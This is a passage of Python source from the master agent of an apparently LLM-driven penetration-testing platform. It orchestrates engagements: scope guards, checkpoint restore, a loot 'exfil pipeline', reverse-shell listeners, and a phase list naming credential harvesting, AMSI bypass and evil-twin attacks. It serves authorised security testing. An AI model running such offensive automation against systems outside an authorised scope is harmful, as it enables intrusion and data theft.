            pass

        # ── Pre-flight reachability (honest blocker, not a doomed scan) ─────
        # If the target is unreachable at scan start (e.g. the VPN/route is
        # down), surface a prominent blocker immediately.  The operator's
        # connectivity gate then pauses for the human after the first failed
        # probes — instead of spinning ~145s of doomed scans and reporting a
        # false "0 findings — complete" (the tun0-down run).  Default on;
        # ARGUS_PREFLIGHT_REACHABILITY=0 disables.
        if os.environ.get("ARGUS_PREFLIGHT_REACHABILITY", "1") != "0":
            try:
                _pf_host = self._intel.get("target_resolved_ip") or self._target_host
                if _pf_host and not await self._preflight_reachable(str(_pf_host)):
                    self._intel["blocker"] = {"kind": "unreachable", "target": str(_pf_host),
                                              "phase": "preflight"}
                    await self._emit("engagement_blocker", {
                        "session_id": session_id, "target": str(_pf_host), "kind": "unreachable",
                        "detail": ("Pre-flight: target not reachable on any candidate port "
                                   "(check the VPN/route). The engagement will pause for you "
                                   "rather than scan a dead target.")})
            except Exception:
                pass

        # ── Proactive /etc/hosts hygiene (stale-vhost reconcile) ───────
        # A leftover `<old-ip> <vhost> # argus-managed` line from a PRIOR
        # engagement wins glibc's first-match rule and silently misdirects
        # every web tool to the old box.  In the reviewed run this wasted
        # ~6-7 min of recon before the reactive remap caught it.  Purge any
        # argus-managed mapping whose IP != this target ONCE, here at scan
        # start (only argus-managed lines — never the operator's own).
        try:
            _recon_ip = (self._intel.get("target_resolved_ip")
                         or self._target_host or target)
            if _recon_ip:
                from agents.recon.vhost_pivot import reconcile_stale_vhosts_for_target
                _reconciled = reconcile_stale_vhosts_for_target(str(_recon_ip))
                if _reconciled:
                    try:
                        await self._emit("vhost_reconciled", {
                            "session_id": session_id,
                            "target_ip": str(_recon_ip),
                            "removed": _reconciled,
                        })
                    except Exception:
                        pass
        except Exception:
            pass

        # ── Create the EngagementContext (the architectural core) ──────
        # Shared by reference with self._intel so EVERY existing code
        # path that mutates intel keeps working unchanged.  All NEW
        # code paths read structured fields off the context for the
        # benefit of objective tracking, pinned insights and the
        # circuit breaker.
        if _EC_AVAILABLE:
            try:
                # Derive the objective: operator-supplied text wins; else
                # mission brief's goal field if present; else the default.
                obj_text = (self._operator_objective or "").strip()
                if not obj_text:
                    mb = self._intel.get("mission_brief") or {}
                    obj_text = (mb.get("goal") or mb.get("description")
                                  or mb.get("objective") or "").strip()
                # Notes/scope are appended as supplemental context so the
                # LLM sees operator constraints in EVERY prompt.
                extras: List[str] = []
                if notes:
                    extras.append(f"OPERATOR NOTES: {notes.strip()[:600]}")
                if scope:
                    extras.append(f"SCOPE: {scope.strip()[:400]}")
                full_obj = obj_text if obj_text else None
                if full_obj and extras:
                    full_obj = full_obj + "\n\n" + "\n".join(extras)
                self._context = EngagementContext(
                    session_id = session_id,
                    target     = self._target_host or target,
                    objective  = full_obj or "",
                    intel_ref  = self._intel,
                )
                # Append extras to the default objective when no
                # operator goal was set.
                if not full_obj and extras:
                    self._context.objective = (
                        self._context.objective.rstrip()
                        + "\n\n" + "\n".join(extras)
                    )
                if _ec_register is not None:
                    _ec_register(self._context)
                # Emit so the UI can render the objective banner.
                await self._emit("engagement_objective", {
                    "scan_id":   session_id,
                    "target":    self._target_host or target,
                    "objective": self._context.objective,
                })
            except Exception as _ec_err:                    # noqa: BLE001
                import logging as _ll
                _ll.getLogger(__name__).warning(
                    "[engagement_context] init failed: %s", _ec_err
                )
                self._context = None

        # ── Mission brief (Improvement #1) — coerce to MissionBrief model ───
        try:
            from db.schemas import MissionBrief as _MB
            if mission_brief is None:
                self._mission_brief = _MB()
            elif isinstance(mission_brief, _MB):
                self._mission_brief = mission_brief
            elif isinstance(mission_brief, dict):
                self._mission_brief = _MB(**mission_brief)
            else:
                self._mission_brief = _MB()
        except Exception as _mb_exc:                                # noqa: BLE001
            import logging as _ml
            _ml.getLogger(__name__).warning(
                "[mission_brief] could not parse — using defaults: %s", _mb_exc
            )
            from db.schemas import MissionBrief as _MB
            self._mission_brief = _MB()

        # Surface mission brief in shared intel so subagents and prompts pick it up
        try:
            self._intel["mission_brief"] = self._mission_brief.dict()
        except Exception:
            self._intel["mission_brief"] = {}

        # Broadcast so the UI can show the brief as a permanent banner
        try:
            await self._emit("mission_brief", {
                "scan_id":       session_id,
                "mission_brief": self._intel["mission_brief"],
            })
        except Exception:
            pass

        # ── Win-condition tracker (Improvement #2) ──────────────────────────
        try:
            from agents.mission.win_conditions import WinConditionTracker
            wc_list = list(getattr(self._mission_brief, "win_conditions", []) or [])
            self._win_tracker = WinConditionTracker(wc_list)
            # Initial evaluation so the UI gets a baseline snapshot
            self._win_snapshot = self._win_tracker.evaluate(self._intel)
            self._intel["win_conditions"] = self._win_snapshot
            await self._emit("win_condition_update", {
                "scan_id":  session_id,
                "phase":    "init",
                **self._win_snapshot,
            })
        except Exception as _wc_exc:                                # noqa: BLE001
            import logging as _ml
            _ml.getLogger(__name__).warning(
                "[win_conditions] init failed: %s", _wc_exc
            )
            self._win_tracker  = None
            self._win_snapshot = {}

        # Initialise meta-agents if available
        if not _META_AGENTS_AVAILABLE:
            import logging as _mlog
            _mlog.getLogger(__name__).warning(
                "[meta-agents] Disabled — import failed: %s", _META_AGENTS_IMPORT_ERROR
            )
            await self._emit("meta_agents_status", {
                "available": False,
                "reason":    _META_AGENTS_IMPORT_ERROR or "import failed",
            })

        if _META_AGENTS_AVAILABLE and self._meta_agents_enabled:
            try:
                _db_conn = db.get_db()
                # MasterChecker was removed (dead plan-auditor that never fired
                # under the operator).  The IssueValidator is now a real finding
                # GATE that runs on the DEFAULT operator path — constructed +
                # registered next to the Error Analyzer (see _reasoning_loop_run);
                # the legacy fallback still builds one here.  The RedTeamExpert is
                # kept — the operator consults it via _consult_advisors.
                try:
                    _op_driver = self._operator_core_enabled()
                except Exception:
                    _op_driver = False
                if _op_driver:
                    self._issue_validator = None      # built on the operator path
                else:
                    self._issue_validator = IssueValidatorAgent(
                        broadcast=self.broadcast, session_id=session_id, db_conn=_db_conn
                    )
                    self._issue_validator._session_id = session_id
                self._expert = RedTeamExpertAgent(
                    broadcast=self.broadcast, session_id=session_id, db_conn=_db_conn
                )
                self._expert._session_id          = session_id
                # Expert needs a back-reference so it can push directives into the
                # master's guidance queue (inject_guidance).
                try:
                    self._expert.bind_master(self)
                except Exception:
                    pass
                # Hand the formal mission brief to the Expert so every prompt
                # is grounded in the same goal/scope/budget definition.
                try:
                    if hasattr(self._expert, "set_mission_brief") and self._mission_brief is not None:
                        self._expert.set_mission_brief(self._mission_brief)
                except Exception:
                    pass
                # Start background task that keeps the listener alive
                self._meta_listener_task = asyncio.create_task(
                    self._meta_tool_listener()
                )
                await self._emit("meta_agents_status", {
                    "available": True,
                    "reason":    "initialized",
                    "expert":    True,
                })
            except Exception as _meta_init_exc:
                import logging as _mlog
                _mlog.getLogger(__name__).error(
                    "[meta-agents] Init failed: %s", _meta_init_exc, exc_info=True
                )
                self._issue_validator = None
                self._expert          = None
                await self._emit("meta_agents_status", {
                    "available": False,
                    "reason":    f"init error: {_meta_init_exc}",
                })

        # Snapshot run config for checkpoint restore
        self._master_config = {
            "target_type":        target_type,
            "auto_exploit":       auto_exploit,
            "threading_enabled":  threading_enabled,
            "max_threads":        max_threads,
            "phases":             list(self._phases_to_run),
            "notes":              notes,
            "scope":              scope,
            "use_reasoning_loop": use_reasoning_loop,
        }

        # ── Restore from checkpoint if resuming ──────────────────────────
        resume_from_phase: Optional[str] = None
        if checkpoint_id:
            try:
                cp = await db.get_latest_checkpoint(session_id)
                if cp:
                    # Only merge a checkpoint's intel_snapshot when it belongs to
                    # THIS engagement (same session+target).  A foreign/stale
                    # snapshot (e.g. a different target in a CIDR session, or a
                    # prior run) must NOT seed its findings/loot as current — that
                    # is the context-bleed vector.  Non-evidence resume state
                    # (used_tools / phases) is always restored.
                    _snap = cp.get("intel_snapshot", {}) or {}
                    _cur = self._intel.get("_origin") or self._engagement_origin()
                    _cp_origin = (cp.get("_origin") or _snap.get("_origin") or {
                        "session_id": str(session_id),
                        "target": str(_snap.get("target_host") or _snap.get("target") or target),
                    })
                    if (str(_cp_origin.get("session_id", "")) == str(_cur.get("session_id", ""))
                            and str(_cp_origin.get("target", "")) == str(_cur.get("target", ""))):
                        self._intel.update(_snap)            # legitimate resume
                    else:
                        import logging as _l
                        _l.getLogger(__name__).info(
                            "checkpoint origin mismatch (%s != %s) — skipping evidence merge",
                            _cp_origin.get("target"), _cur.get("target"))
                    # re-assert provenance + scrub anything the merge carried in
                    self._intel["_origin"] = self._engagement_origin()
                    try:
                        self._scrub_foreign_evidence(self._intel, self._intel["_origin"])
                    except Exception:
                        pass
                    self._used_tools       = cp.get("used_tools", {})
                    self._phases_completed = cp.get("phases_completed", [])
                    self._phases_to_run    = cp.get("phases_to_run") or self._phases_to_run
                    resume_from_phase      = cp.get("current_phase")
                    self._intel["state"]   = cp.get("state_machine", "INIT")
                    await self.emit_reasoning(
                        step       = "checkpoint_restored",
                        reasoning  = f"Restored state from checkpoint {checkpoint_id}",
                        decision   = f"Resuming after phase: {resume_from_phase}",
                        next_action= "Skipping completed phases"
                    )
                    await self._emit("checkpoint_restored", {
                        "checkpoint_id":    checkpoint_id,
                        "resume_after":     resume_from_phase,
                        "phases_completed": self._phases_completed,
                    })
            except Exception as _ce:
                import logging as _l
                _l.getLogger(__name__).warning("Checkpoint restore failed: %s", _ce)

        # ── Shared tool-result cache injected into intel so execute_tasks()
        # on ANY slave agent can check it and avoid re-running the same tool
        # with the same args.  Using a single dict object (by reference) means
        # every agent that receives self._intel automatically shares the cache.
        self._intel["_tool_cache"] = self._instruction_cache

        # Store operator notes and scope for all planning prompts
        self._notes = notes.strip() if notes else ""
        self._scope = scope.strip() if scope else ""
        if self._notes:
            self._intel["operator_notes"].append({
                "note": f"[OPERATOR GUIDANCE] {self._notes}",
                "ts":   datetime.utcnow().isoformat()
            })
        if self._scope:
            self._intel["operator_notes"].append({
                "note": f"[SCOPE/FOCUS] {self._scope}",
                "ts":   datetime.utcnow().isoformat()
            })

        # Improvement #11 — retune noise budget from operator hints.
        try:
            from agents.reasoning.noise_budget import (
                budget_from_mode, parse_mode_from_text,
            )
            mode = parse_mode_from_text(f"{self._notes} {self._scope}")
            self.noise_budget = budget_from_mode(mode, session_id=session_id)
            try:
                await self._broadcast_raw({
                    "type":       "noise_budget_updated",
                    "session_id": session_id,
                    "agent":      "master",
                    "data":       self.noise_budget.to_dict(),
                })
            except Exception:
                pass
        except Exception:
            pass

        # Recommendation #7 — exfiltration pipeline.  Per-session loot
        # collector that DoI-classifies tool/shell output, stages it
        # to disk, manifests it, and surfaces findings.  Wire it before
        # listener_manager so any callbacks captured can immediately
        # feed loot through it.
        try:
            from agents.reasoning.exfil_pipeline import ExfilPipeline
            async def _exfil_emit_finding(*, title, description, severity, host, extra):
                # Adapter — translate ExfilPipeline's emit signature into
                # the platform's standard finding pipeline.
                try:
                    await db.store_finding(
                        session_id  = session_id,
                        agent       = AgentName.MASTER,
                        phase       = self._intel.get("state", AttackPhase.POST_EXPLOIT),
                        severity    = FindingSeverity(severity.lower()) if isinstance(severity, str) else severity,
                        title       = title,
                        description = description,
                        host        = host or self._target,
                        port        = None,
                        service     = None,
                        cves        = [],
                        exploits    = [],
                        tool_used   = "exfil_pipeline",
                        raw_output  = None,
                        extra       = extra or {},
                    )
                except Exception:
                    pass
            self._exfil_pipeline = ExfilPipeline(
                session_id   = session_id,
                target       = target,
                emit_finding = _exfil_emit_finding,
            )
            try:
                await self._broadcast_raw({
                    "type":       "exfil_pipeline_ready",
                    "session_id": session_id,
                    "agent":      "master",
                    "data": {
                        "loot_dir": self._exfil_pipeline.manifest_summary().get("loot_dir"),
                    },
                })
            except Exception:
                pass
        except Exception as _exfil_err:
            import logging as _l
            _l.getLogger(__name__).warning(
                "ExfilPipeline failed to initialise: %s", _exfil_err)
            self._exfil_pipeline = None

        # Quick-Fix-3 — Tool-availability report.  Probe MCP for every
        # tool the primer chains depend on; surface missing ones up-front
        # so the operator immediately sees gaps and can apt-install /
        # disable the affected primers rather than debug from logs.
        try:
            await self._probe_primer_tool_availability(session_id)
        except Exception as _probe_err:
            import logging as _l
            _l.getLogger(__name__).warning(
                "tool-availability probe failed: %s", _probe_err)

        # Recommendation C — instantiate the listener manager once we
        # know enough about the engagement to resolve LHOST.
        try:
            from agents.reasoning.listener_manager import ListenerManager
            self.listener_manager = ListenerManager(master_agent=self)
            try:
                await self._broadcast_raw({
                    "type":       "listener_manager_ready",
                    "session_id": session_id,
                    "agent":      "master",
                    "data": {
                        "lhost":   self.listener_manager.lhost,
                        "backend": self.listener_manager._default_backend,
                    },
                })
            except Exception:
                pass
        except Exception as _le:
            self.listener_manager = None

        # Improvement #16 — assemble the scope-guard prefix from
        # engagement context + operator notes/scope and bind it to self
        # so every BaseAgent.think() call auto-prepends it.  Also stash
        # the structured guard on intel for the _intel_summary renderer.
        try:
            from agents.reasoning.scope_guard import (
                build_scope_guard, build_scope_prefix,
            )
            _guard = build_scope_guard(
                target              = target,
                engagement_context  = self._intel.get("engagement_context") or {},
                notes               = self._notes,
                scope               = self._scope,
            )
            self._scope_guard_obj = _guard
            self._scope_guard     = build_scope_prefix(_guard)
            self._intel["scope_guard"] = _guard.to_dict()
            try:
                await self._broadcast_raw({
                    "type":       "scope_guard_updated",
                    "session_id": session_id,
                    "agent":      "master",
                    "data":       _guard.to_dict(),
                })
            except Exception:
                pass
        except Exception as _se:
            self._scope_guard = ""

        # Improvement #13 — auto-derive dry-run mode from engagement type
        # + operator hints.  CTF/lab/training boxes flip it off; prod /
        # red-team / live engagements force it on.
        try:
            from agents.reasoning.dry_run import default_mode_for_engagement
            self.dry_run_mode = default_mode_for_engagement(
                engagement_type = target_type,
                target_type     = target_type,
                notes           = self._notes,
                scope           = self._scope,
            )
            try:
                await self._broadcast_raw({
                    "type":       "dry_run_mode_changed",
                    "session_id": session_id,
                    "agent":      "master",
                    "data": {
                        "enabled": self.dry_run_mode,
                        "source":  "auto",
                        "reason":  f"engagement={target_type}",
                    },
                })
            except Exception:
                pass
        except Exception:
            pass

        # ── Per-session file logger — captures every tool call, LLM call,
        # phase transition, finding and error into logs/<timestamp>_<sid>/
        # for post-scan troubleshooting.  Never raises.
        self._scan_logger = start_scan_logger(
            session_id      = session_id,
            target          = target,
            engagement_type = target_type,
        )
        try:
            self._scan_logger.log_info(
                "session_init",
                f"target={target} type={target_type} auto_exploit={auto_exploit} "
                f"reasoning_loop={self._use_reasoning_loop}",
            )
        except Exception:
            pass

        # ── Fetch the full MCP tool catalog once — makes every subsequent
        # LLM planning prompt aware of the complete Kali arsenal exposed by
        # mcp-server.js (hydra, sqlmap, gobuster, john, hashcat, wfuzz,
        # nikto, wpscan, smbclient, enum4linux, crackmapexec, impacket-*,
        # ffuf, medusa, ncrack, responder, bloodhound, …).
        await self._load_tool_catalog()

        # ── Step 1: LLM check — warn if offline but NEVER halt ───
        # Scan always starts regardless of LLM state.  Each phase has hardcoded
        # fallback tool lists so recon/vuln/web phases run even without an LLM.
        # LLM-guided planning kicks in as soon as Ollama becomes available.
        await self.set_status(AgentStatus.RUNNING, f"Initialising pentest on {target}")
        llm_ok = await self.check_llm_available()
        # Share LLM availability with meta-agents so they skip their own cold-check
        # and avoid a redundant /api/tags request at the start of every phase.
        if self._issue_validator:
            self._issue_validator._llm_available = self._llm_available
        if self._expert:
            self._expert._llm_available          = self._llm_available
        if not llm_ok:
            await self._emit("llm_status", {
                "available": False,
                "url":       OLLAMA_URL if hasattr(self, '_target') else "",
                "message":   (
                    "LLM not reachable — scan will run with built-in defaults. "
                    "AI-guided planning will engage automatically once Ollama responds."
                )
            })

        # Initial node in attack graph
        target_node = f"target_{target.replace('.', '_').replace('/', '_')}"
        await self.add_node(
            node_id  = target_node,
            type     = "host",
            label    = target,
            host     = target,
            metadata = {"role": "primary_target", "type": target_type}
        )

        # ── Phase icon/label catalogue (shared by fresh start and resume) ───
        _PHASE_ICONS = {
            "recon":        ("🔍", "Reconnaissance",      "nmap, whatweb, enum4linux"),
            "vuln_id":      ("🔬", "Vulnerability ID",    "nmap --script vuln, searchsploit, nikto"),
            "web_testing":  ("🌐", "Web App Testing",     "gobuster, sqlmap, nikto"),
            "osint":        ("🕵", "OSINT / ExploitDB",   "searchsploit, CVE lookup"),
            "exploit":      ("💥", "Exploitation",        "Based on findings — TBD after recon"),
            "post_exploit": ("🎭", "Post Exploitation",   "Credential harvest, network map"),
            "privesc":      ("⬆",  "Privilege Escalation","linPEAS, sudo, SUID, cron"),
            "reporting":    ("📄", "Report Generation",   "Full findings report"),
            "lateral":      ("↔",  "Lateral Movement",    "ad_enum, kerberoast, ntlm_capture"),
            "cloud":        ("☁",  "Cloud Enumeration",   "aws_enum, azure_enum, gcp_enum"),
            "container":    ("🐳", "Container Audit",     "docker_audit, k8s_audit"),
            "evasion":      ("👻", "AV/EDR Evasion",      "defense_enum, av_evasion, amsi_bypass"),
            "traffic":      ("📡", "Traffic Analysis",    "pcap_capture, credential_sniff"),
            "evidence":     ("📷", "Evidence Collection", "screenshot, flag_capture"),
            "forensics":    ("🔎", "Digital Forensics",   "artifact_collect, timeline, memory_analysis"),
            "wireless":     ("📶", "Wireless Assessment", "wifi_scan, wpa2_crack, evil_twin"),
            "iot":          ("📟", "IoT Assessment",      "iot_device_scan, iot_default_creds, iot_protocol, iot_firmware"),
        }

        # ── Step 2: master plan — skip LLM call on resume ─────
        _is_resume = bool(resume_from_phase)

        if _is_resume:
            # Reuse the plan saved in intel by the original run — no LLM call needed.
            plan = self._intel.get("_master_plan") or {
                "phases":           [{"phase": p} for p in self._phases_to_run],
                "assessment_type":  self._intel.get("target_type", "resumed"),
                "attack_hypothesis": self._intel.get("attack_surface_notes", "Resuming from checkpoint"),
                "rationale":        "Resumed from checkpoint — plan reconstructed from saved intel",
            }
            await self.emit_reasoning(
                step       = "plan_restored",
                reasoning  = "Resuming from checkpoint — skipping LLM plan creation",
                decision   = f"Using saved plan, resuming after: {resume_from_phase}",
                next_action= f"Skipping {len(self._phases_completed)} completed phase(s)"
            )
        else:
            # Fresh start — ask LLM to create the plan (never halts on failure)
            try:
                plan = self._safe_llm_result(await self._create_master_plan(target, target_type))
            except Exception as e:
                # Any planning error → warn and use empty plan; phases run with defaults
                await self._emit("llm_status", {
                    "available": False,
                    "message":   f"Master plan unavailable ({e}) — running all phases with built-in defaults."
                })
                plan = {}

            # Persist plan in intel so future resumes can reuse it without an LLM call
            self._intel["_master_plan"] = plan

            # Improvement #8 — episodic memory recall (best-effort, never blocks)
            try:
                recalled = await db.recall_similar_episodes(
                    target_type        = (plan.get("assessment_type") or target_type or "").lower() or None,
                    services           = plan.get("priority_services") or [],
                    cves               = list(self._intel.get("cves") or []),
                    limit              = 5,
                    exclude_session_id = session_id,
                )
            except Exception as _exc:
                recalled = []
            if recalled:
                self._intel["episodic_recalls"] = recalled
                await self._emit("episode_recalled", {
                    "session_id": session_id,
                    "count":      len(recalled),
                    "episodes":   recalled,
                })
                await self.emit_reasoning(
                    step       = "episodic_memory_recall",
                    reasoning  = f"Recalled {len(recalled)} similar past engagement(s) for context",
                    decision   = "Using as priors for scan biasing",
                    next_action= "Continue with current planning"
                )

            await self._emit("master_plan", {"plan": plan, "target": target})
            await self.emit_reasoning(
                step       = "master_plan_created",
                reasoning  = plan.get("rationale", "Initial pentest plan created"),
                decision   = f"Assessment type: {plan.get('assessment_type', 'full')}",
                next_action= "Begin reconnaissance phase",
                data       = plan
            )

        # ── Build skeleton steps ───────────────────────────────
        phases_in_plan = _safe_list(plan.get("phases", []))
        skeleton_steps = []
        seen_phases    = set()
        done_set       = set(self._phases_completed)

        for ph in phases_in_plan:
            phase_key = str(ph.get("phase","")).lower()
            if phase_key in _PHASE_ICONS and phase_key not in seen_phases:
                icon, lbl, tools_hint = _PHASE_ICONS[phase_key]
                plan_tools = ph.get("tools", [])
                step_status = "done" if phase_key in done_set else "pending"
                skeleton_steps.append({
                    "id":          phase_key,
                    "label":       lbl,
                    "icon":        icon,
                    "phase":       phase_key,
                    "tool":        ", ".join(plan_tools[:3]) if plan_tools else tools_hint,
                    "status":      step_status,
                    "result":      "Completed before pause" if step_status == "done" else "",
                    "detail":      ph.get("reasoning",""),
                    "probability": None,
                })
                seen_phases.add(phase_key)

        for phase_key, (icon, lbl, tools_hint) in _PHASE_ICONS.items():
            if phase_key not in seen_phases:
                step_status = "done" if phase_key in done_set else "pending"
                skeleton_steps.append({
                    "id":          phase_key,
                    "label":       lbl,
                    "icon":        icon,
                    "phase":       phase_key,
                    "tool":        tools_hint,
                    "status":      step_status,
                    "result":      "Completed before pause" if step_status == "done" else "",
                    "detail":      "",
                    "probability": None,
                })

        hypothesis = plan.get("attack_hypothesis","")

        if _is_resume:
            # Restore event — frontend merges into existing steps preserving richer data
            await self._emit("plan_skeleton_restore", {
                "steps":            skeleton_steps,
                "hypothesis":       hypothesis,
                "assessment_type":  plan.get("assessment_type", "resumed"),
                "target":           target,
                "phases_completed": list(done_set),
                "resume_after":     resume_from_phase,
                "ts":               datetime.utcnow().isoformat(),
            })
        else:
            await self._emit("plan_skeleton", {
                "steps":           skeleton_steps,
                "hypothesis":      hypothesis,
                "assessment_type": plan.get("assessment_type", "unknown"),
                "target":          target,
                "ts":              datetime.utcnow().isoformat(),
            })

        # ── Step 3: Start Attack Graph Agent (background, runs whole session) ──
        # On resume, skip restarting the agent — the graph already exists in DB and
        # will be served from there.  Starting it fresh would trigger a _wait_for_agents_idle()
        # stall ("1 item still active") while it re-crawls an already-complete graph.
        if not _is_resume:
            try:
                from agents.attack_graph_agent import AttackGraphAgent
                import db.mongo_client as _db_mod
                _aga = AttackGraphAgent(
                    session_id = session_id,
                    target     = target,
                    broadcast  = self.broadcast,
                    db         = _db_mod.get_db(),
                    services   = self._intel.get("services", {}),
                    master     = self,   # parallel chain analysis → operator advisories
                )
                self._create_task(_aga.run_analysis_loop())
                # Keep reference so we can push updated services later
                self._attack_graph_agent = _aga
            except Exception as _aga_err:
                import logging as _l
                _l.getLogger(__name__).warning("AttackGraphAgent failed to start: %s", _aga_err)

        # ── Step 4: Execute phases ─────────────────────────────
        try:
            if str(target_type).lower() in ("ai", "llm", "agent"):
                # AI / agentic target → run the AI Red-Team Engine INSTEAD of the
                # network phases; findings still flow through store_finding → the
                # validator gate → the report.  Additive + guarded; a non-AI
                # engagement never reaches this branch.
                try:
                    await self._advance_phase(AttackPhase.RECON)
                except Exception:
                    pass
                from agents.ai_red_team.engine import AIRedTeamEngine
                _ai_cfg = (self._intel.get("ai_target")
                           or (self._intel.get("engagement_context") or {}).get("ai_target")
                           or {"type": "single_endpoint",
                               "url": self._target_url or target})
                await AIRedTeamEngine(self, _ai_cfg).run(session_id)
            else:
                await self._execute_phases(session_id, target, plan, resume_from=resume_from_phase)
        except asyncio.CancelledError:
            # Explicit user cancellation (tool_stop / request_stop) — respect it
            await self.set_status(AgentStatus.IDLE, "Pentest cancelled by user")
            await db.update_session(session_id, {"status": SessionStatus.PAUSED})
            try:
                if getattr(self, "_scan_logger", None):
                    self._scan_logger.log_info("session_cancel", "User cancelled scan")
            except Exception:
                pass
            # B-3 — release listeners + B-5 — terminate shell PTYs even on
            # cancel.  Otherwise ports 4444-4474 stay bound and orphan
            # msfconsole/ncat/evil-winrm processes leak across scans.
            await self._teardown_runtime_resources()
            close_scan_logger(session_id)
            # Drop the EngagementContext registration so subagents from
            # future sessions don't accidentally find this one.
            if _EC_AVAILABLE and _ec_unregister is not None:
                try:
                    _ec_unregister(session_id)
                except Exception:
                    pass
            # Reset finding-trigger fire memory so re-running the same
            # session_id later starts fresh.
            if _FT_AVAILABLE and _ft is not None:
                try:
                    _ft.reset_fired(session_id)
                except Exception:
                    pass
            return {"status": "cancelled"}
        except Exception as e:
            # Any other error (including any stray RuntimeError) — log and continue
            # to the completion block so a partial scan is still saved.
            import traceback as _tb
            tb_str = _tb.format_exc()
            # Extract the innermost frame so the operator sees WHICH line blew up.
            _last_frame = ""
            try:
                frames = _tb.extract_tb(e.__traceback__)
                if frames:
                    f = frames[-1]
                    _last_frame = f"{f.filename}:{f.lineno} in {f.name}"
            except Exception:
                pass
            await self._emit("scan_error", {
                "error":     str(e),
                "error_type": type(e).__name__,
                "where":     _last_frame,
                "traceback": tb_str[-2000:],
                "message":   f"Non-fatal error during phases: {e} at {_last_frame} — saving partial results."
            })
            import logging as _log
            _log.getLogger(__name__).error("_execute_phases error (non-fatal): %s\n%s", e, tb_str)
            try:
                if getattr(self, "_scan_logger", None):
                    self._scan_logger.log_error("_execute_phases", exc=e)
            except Exception:
                pass

        # Complete
        await self.set_status(AgentStatus.DONE, "Pentest lifecycle complete")
        await db.update_session(session_id, {
            "status":       SessionStatus.COMPLETED,
            "completed_at": datetime.utcnow()
        })

        # Improvement #8 — record this engagement as an episode for future recall
        try:
            from agents.reasoning.episodic_memory import build_episode_payload
            hyp_list = self._intel.get("hypotheses") or []
            episode = build_episode_payload(
                session_id    = session_id,
                target        = target,
                target_type   = (self._intel.get("target_type")
                                 or (plan or {}).get("assessment_type") or "unknown"),
                intel         = self._intel,
                hypotheses    = hyp_list,
                ranked_paths  = self._intel.get("ranked_attack_paths") or [],
                mission_brief = getattr(self, "mission_brief", None),
            )
            stored = await db.record_engagement_episode(episode)
            await self._emit("episode_recorded", {
                "session_id": session_id,
                "episode":    stored,
            })
        except Exception as _exc:
            logger.warning("episodic memory record failed: %s", _exc)

        # Continuous learning — distil this engagement's GENUINE, confirmed-working
        # techniques into the RAG so future scans benefit from hard-won experience.
        # Double-gated: only an engagement that PROVED something (foothold / flag /
        # cred / privesc / confirmed vuln) contributes, and only confirmed,
        # reusable techniques are stored — NEVER raw scan findings.  Best-effort;
        # never blocks finalize.  Disable with ARGUS_RAG_LEARNING=0.
        try:
            if os.environ.get("ARGUS_RAG_LEARNING", "1") != "0":
                from agents.reasoning.lesson_distiller import distill_and_store
                # FIRE-AND-FORGET: the engagement is already complete and recorded
                # above.  Learning runs in the BACKGROUND so it can NEVER delay or
                # block finalize, hang the server, or affect the pentest outcome —
                # finalize returns instantly exactly as before.  The distiller is
                # self-wrapped and returns 0 on any error, so the unawaited task
                # cannot raise into the loop either.
                asyncio.ensure_future(distill_and_store(
                    master      = self,
                    intel       = self._intel,
                    session_id  = session_id,
                    target      = target,
                    target_type = (self._intel.get("target_type")
                                   or (plan or {}).get("assessment_type") or "unknown")))
        except Exception as _lexc:
            logger.warning("RAG lesson distillation failed to schedule: %s", _lexc)

        # Skill learning loop (#1): attribute this engagement's genuine findings to
        # the skills that fired + refresh their learned weights / review flags, so
        # the catalog self-improves at *prioritising* what actually yields.  The
        # distiller already learns reusable techniques into RAG; this learns which
        # technology skills earn their place.  Best-effort; never blocks finalize.
        try:
            if os.environ.get("ARGUS_SKILL_REGISTRY", "1") != "0":
                from knowledge import skill_telemetry as _stl
                _stl.learn_from_engagement(
                    list(self._intel.get("_fired_skills", []) or []),
                    list(getattr(self, "findings", []) or []))
        except Exception as _slexc:
            logger.warning("skill-telemetry learning failed: %s", _slexc)

        await self._emit("pentest_complete", {
            "session_id": session_id,
            "intel":      self._intel,
            "message":    "Pentest complete — review Findings Board and generate report."
        })
        # B-3 / B-5 — Recommendation C: release every still-running listener
        # AND terminate every spawned shell PTY so a subsequent engagement
        # on the same process doesn't collide on ports 4444-4474 and so
        # msfconsole/ncat/evil-winrm handlers don't leak.
        await self._teardown_runtime_resources()

        # ── Forensic snapshots before close ─────────────────────────────
        # Persist the FINAL intel dict and findings list to the per-session
        # log directory so the bundle is self-contained.  Excludes the
        # ``raw_outputs`` blob (often megabytes) — those are still written
        # to ``tool_calls.jsonl`` per-call, no need to duplicate.
        try:
            from utils.scan_logger import (
                snapshot_intel as _snap_intel,
                snapshot_findings as _snap_finds,
            )
            intel_for_log = {k: v for k, v in (self._intel or {}).items()
                             if k != "raw_outputs"}
            _snap_intel(session_id, intel_for_log)

            # Pull final findings from Mongo so the snapshot reflects
            # post-dedup state.  Falls back to in-memory intel.findings
            # on error so the bundle never lacks the findings file.
            findings_list: list = []
            try:
                _dbh = db.get_db()
                cursor = _dbh.findings.find({"session_id": session_id})
                async for doc in cursor:
                    doc.pop("_id", None)
                    findings_list.append(doc)
            except Exception:
                findings_list = list(self._intel.get("findings") or [])
            _snap_finds(session_id, findings_list)
        except Exception:
            pass

        # Flush and close the per-session scan log
        try:
            close_scan_logger(session_id)
        except Exception:
            pass
        # Drop the EngagementContext registration so subagents from
        # future sessions don't accidentally find this one.
        if _EC_AVAILABLE and _ec_unregister is not None:
            try:
                _ec_unregister(session_id)
            except Exception:
                pass
        # Reset finding-trigger fire memory so re-running the same
        # session_id later starts fresh.
        if _FT_AVAILABLE and _ft is not None:
            try:
                _ft.reset_fired(session_id)
            except Exception:
                pass
        # Stop + unregister the Error Analyzer agent
        try:
            from agents.meta.error_analyzer_agent import unregister_analyzer
            if getattr(self, "_error_analyzer", None) is not None:
                self._error_analyzer.request_stop()
            unregister_analyzer(session_id)
        except Exception:
            pass
        # Stop + unregister the Issue Validator (finding gate)
        try:
            from agents.meta.issue_validator_agent import unregister_validator
            if getattr(self, "_issue_validator", None) is not None:
                try:
                    self._issue_validator.request_stop()
                except Exception:
                    pass
            unregister_validator(session_id)
        except Exception:
            pass
        # Unregister the OSINT intel cascade (cancels any in-flight
        # fan-outs and frees the per-session source factories)
        try:
            from agents.osint.intel_cascade import unregister_cascade
            unregister_cascade(session_id)
        except Exception:
            pass
        return {"status": "done", "intel": self._intel}

    # ─── State Machine ────────────────────────────────────────

    async def _transition_state(self, new_state: str):
        """Advance the pentest state machine to a new state."""
        old = self._intel.get("state", "INIT")
        self._intel["state"] = new_state
        await self._emit("state_change", {
            "from":    old,
